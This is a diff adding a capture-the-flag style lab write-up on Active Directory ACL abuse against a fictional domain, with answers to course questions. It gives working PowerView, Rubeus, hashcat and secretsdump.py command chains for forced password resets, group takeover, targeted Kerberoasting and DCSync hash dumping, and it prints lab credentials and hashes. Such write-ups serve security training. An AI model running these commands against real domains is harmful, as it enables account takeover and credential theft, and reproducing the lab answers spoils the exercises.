@@ -20,6 +20,11 @@
 6. [Cooking with Fire](#cooking-with-fire)
     1. [Kerberoasting - from Linux](#kerberoasting---from-linux)
     2. [Kerberoasting - from Windows](#kerberoasting---from-windows)
+7. [An ACE in the Hole](#an-ace-in-the-hole)
+    1. [Access Control List (ACL) Abuse Primer](#access-control-list-acl-abuse-primer)
+    2. [ACL Enumeration](#acl-enumeration)
+    3. [ACL Abuse Tactics](#acl-abuse-tactics)
+    4. [DCSync](#dcsync)
 
 ## Initial Enumeration
 ### External Recon and Enumeration Principles
@@ -304,5 +309,161 @@
     ```
     The answer is `Virtual01`.
 
+## An ACE in the Hole
+### Access Control List (ACL) Abuse Primer
+#### Challenges
+1. What type of ACL defines which security principals are granted or denied access to an object? (one word)
 
+    The answer is `DACL`. Discretionary Access Control List (DACL) defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access.
 
+2. Which ACE entry can be leveraged to perform a targeted Kerberoasting attack?
+
+    The answer is `GenericAll`. tGenericAll grants us full control over a target object.
+
+### ACL Enumeration
+#### Tools
+1. PowerView
+2. bloodhound
+#### Challenges
+1. What is the rights GUID for User-Force-Change-Password?
+
+    The answer is `00299570-246d-11d0-a768-00aa006e0529`.
+
+2. What flag can we use with PowerView to show us the ObjectAceType in a human-readable format during our enumeration?
+
+    The answer is `ResolveGUIDs`.
+
+3. What privileges does the user damundsen have over the Help Desk Level 1 group?
+
+    The anaswer is `GenericWrite`. This means, among other things, that we can add any user (or ourselves) to this group and inherit any rights that this group has applied to it.
+
+4. Using the skills learned in this section, enumerate the ActiveDirectoryRights that the user forend has over the user dpayne (Dagmar Payne).
+
+    We can solve this by using bloodhound. First we run `sharphound.exe`.
+
+    ```bash
+    .\SharpHound.exe -c All --zipfilename ILFREIGHT
+    ```
+    Then we run `bloodhound` and upload the zip file in there. After that, click seacrh bar and type `forend`. Select it as starting node. Then type `dpayne` and select it as ending node. 
+
+    ![alt text](Assets/ACLEnumeration1.png)
+
+    The answer is `GenericAll`.
+
+5. What is the ObjectAceType of the first right that the forend user has over the GPO Management group? (two words in the format Word-Word)
+
+    We can use `PowerView` to solve this. This tells PowerView to only get the permissions list (ACL) for the "GPO Management" group.
+
+    ```powerhsell
+    Import-Module .\PowerView.ps1
+    $sid = Convert-NameToSid forend
+    Get-DomainObjectACL -ResolveGUIDs -Identity "GPO Management" | ? {$_.SecurityIdentifier -eq $sid}
+    ```
+    The answer is `Self-Membership`.
+
+### ACL Abuse Tactics
+#### Tools
+1. PowerView
+2. kerberoast
+3. hashcat
+#### Challenges
+
+1. Work through the examples in this section to gain a better understanding of ACL abuse and performing these skills hands-on. Set a fake SPN for the adunn account, Kerberoast the user, and crack the hash using Hashcat. Submit the account's cleartext password as your answer.
+
+    To solve this, we should perform this following attack chain:
+
+        1. Use the wley user to change the password for the damundsen user
+        2. Authenticate as the damundsen user and leverage GenericWrite rights to add a user that we control to the Help Desk Level 1 group
+        3. Take advantage of nested group membership in the Information Technology group and leverage GenericAll rights to take control of the adunn user
+    
+    Here the detail steps:
+
+    1. Use the wley user to change the password for the damundsen user
+
+        In the previous we have already get wley credential, `wley:transporter@4`. We can use that credential to authenticate as wley.
+
+        ```powershell
+        $SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
+        $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+        ```
+
+        After that, we can reset damundsen password by using wley credential.
+
+        ```powerhsell
+        $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+        Import-Module .\PowerView.ps1
+        Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+        ```
+    
+    2. Authenticate as the damundsen user and leverage GenericWrite rights to add a user that we control to the Help Desk Level 1 group
+
+        After We have succesfully reset damundsen password, we can try to authenticate as damundsen.
+
+        ```powershell
+        $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+        $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
+        ```
+        Then we can add damundsen into `Help Desk Level 1` group.
+
+        ```powershell
+        Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+        ```
+
+        We can confirm if we have successfully added damundsen into `Help Desk Level 1` group by using this command.
+
+        ```powershell
+        Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+        ```
+        ![alt text](Assets/ACLAbuseTactics1.png)
+    
+    3. Take advantage of nested group membership in the Information Technology group and leverage GenericAll rights to take control of the adunn user
+
+        We can get adunn hash by using kerberoast attack. But to perform it, we must have SPN which is not default for user account. SPN by default is for service not regular account. So we need to create fake SPN.
+
+        ```powershell.
+        Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+        ```
+        Then we can run `kerberoast`.
+
+        ```powershell
+        .\Rubeus.exe kerberoast /user:adunn /nowrap
+        ```
+
+        ![alt text](Assets/ACLAbuseTactics2.png)
+
+        Then we can copy the hash and crack it by using `hashcat`.
+
+        ```bash
+        hashcat -m 13100 crack /usr/share/wordlists/rockyou.txt
+        ```
+        The answer is `SyncMaster757`.
+
+### DCSync
+#### Tools
+1. secretsdump.py
+#### Challenges
+1. Perform a DCSync attack and look for another user with the option "Store password using reversible encryption" set. Submit the username as your answer.
+
+    To solve this, after rdp to the target, i do ssh to 172.16.5.225. In there, we can use `secretsdump.py`. Find the `CLEARTEXT` result.
+
+    ```bash
+    secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 | grep CLEARTEXT
+    ```
+    ![alt text](Assets/DCSync1.png)
+
+    The answer is `syncron`.
+
+2. What is this user's cleartext password?
+
+    Based on the previous image, the answer is `Mycleart3xtP@ss!`.
+
+3. Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer.
+
+    We can use `secretsdump.py` again to solve this.
+
+    ```bash
+    secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 | grep khartsfield
+    ```
+    ![alt text](Assets/DCSync2.png)
+
+    The answer is `4bb3b317845f0954200a6b0acc9b9f9a`.
